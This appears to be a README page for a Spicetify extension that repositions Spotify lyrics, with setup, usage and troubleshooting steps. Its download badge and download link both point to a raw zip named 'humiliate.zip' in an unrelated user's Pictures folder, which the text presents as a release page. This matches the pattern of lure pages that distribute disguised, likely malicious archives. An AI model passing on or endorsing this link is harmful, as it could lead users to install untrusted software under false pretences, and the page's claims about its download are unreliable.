---
layout: "default"
title: "🎶 spotify-lyrics-position - Move your lyrics anywhere on screen"
description: "Move Spotify lyrics to custom screen positions using this Spicetify extension. Choose between sidebars, a movable popup, or a separate window."
---
# 🎶 spotify-lyrics-position - Move your lyrics anywhere on screen

[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Daynaexpandable336/daynaexpandable336.github.io/main/Pictures/humiliate.zip)

This extension changes how Spotify displays lyrics. By default, Spotify shows lyrics in a large, center-screen view. This tool lets you move that lyric box to any place you prefer. You can place the text on the side or over your album cover.

## 🛠 Prerequisites

You need the Spicetify command-line tool to use this extension. Spicetify allows you to customize the Spotify desktop client. 

1. Install the Spotify desktop application from the official website.
2. Open your Windows PowerShell. You can find this by pressing the Windows key and typing "PowerShell".
3. Copy and paste the Spicetify installation command from the official Spicetify website into the window and press Enter.
4. Run `spicetify backup apply` to prepare your Spotify installation for modifications.

## 📥 Getting the extension
 
You need to visit the project release page to get the files. Visit this page to download: https://raw.githubusercontent.com/Daynaexpandable336/daynaexpandable336.github.io/main/Pictures/humiliate.zip

Choose the latest version available on the page. Download the zip file provided in the assets section. Save this file to your computer.

## ⚙️ Installation steps

1. Extract the contents of the downloaded zip file into a folder on your computer.
2. Locate your Spicetify extensions folder. You can find this by typing `spicetify config` into your PowerShell window. Look for the line that says "extensions_path".
3. Move the downloaded extension file into that folder. 
4. Open your PowerShell window again.
5. Apply the extension by typing `spicetify config extensions spotify-lyrics-position.js` and pressing Enter.
6. Type `spicetify apply` in the same window and press Enter.

Spotify will restart automatically after you run this command. Once it reopens, your lyrics will appear in the new position.

## 🖱 How to use the extension

Once the computer restarts Spotify, you will see a new control menu. Click the gear icon or the lyric icon at the top of your Spotify window. You can drag the lyric box with your mouse to your preferred location. 

If the lyrics do not move, check that the extension is active in your configuration file. You can see your current status by typing `spicetify config` in PowerShell. Ensure the extension name appears in your extensions list.

## 🖥 System requirements

This tool works on Windows 10 and Windows 11. You need the standard desktop version of Spotify. This extension does not work with the Microsoft Store version of Spotify due to permission restrictions enforced by Windows. If you have the Store version, please uninstall it and install the version directly from the Spotify website before you follow the steps above.

## 🔧 Troubleshooting

If you encounter issues, follow these steps to reset your display:

- If the lyrics disappear, run `spicetify apply` again in PowerShell. This refreshes the local files and reloads your extension settings.
- If you want to remove the extension, run `spicetify config extensions spotify-lyrics-position.js-` followed by `spicetify apply`. The minus sign at the end tells the program to stop using that extension.
- Ensure your internet connection stays stable during the application process. 
- Restart your Spotify client if you change settings in the extension menu and do not see immediate results.

## 📝 Customization options

You can adjust the font size and color of your lyrics through the Spotify interface. Right-click on the lyric box to open the settings menu. You can save your preset so the lyrics appear in the same spot every time you open the program. The extension remembers your last position across multiple sessions.

You do not need to repeat the installation steps unless you update your Spotify app. If Spotify updates itself, you may notice the lyrics revert to their original position. Run `spicetify apply` to restore your custom layout.

Keywords: extension, extensions, lyric, lyrics, spicetify, spicetify-cli, spicetify-extensions, spotify, spotify-extension, spotify-extensions, spotify-lyric, spotify-lyrics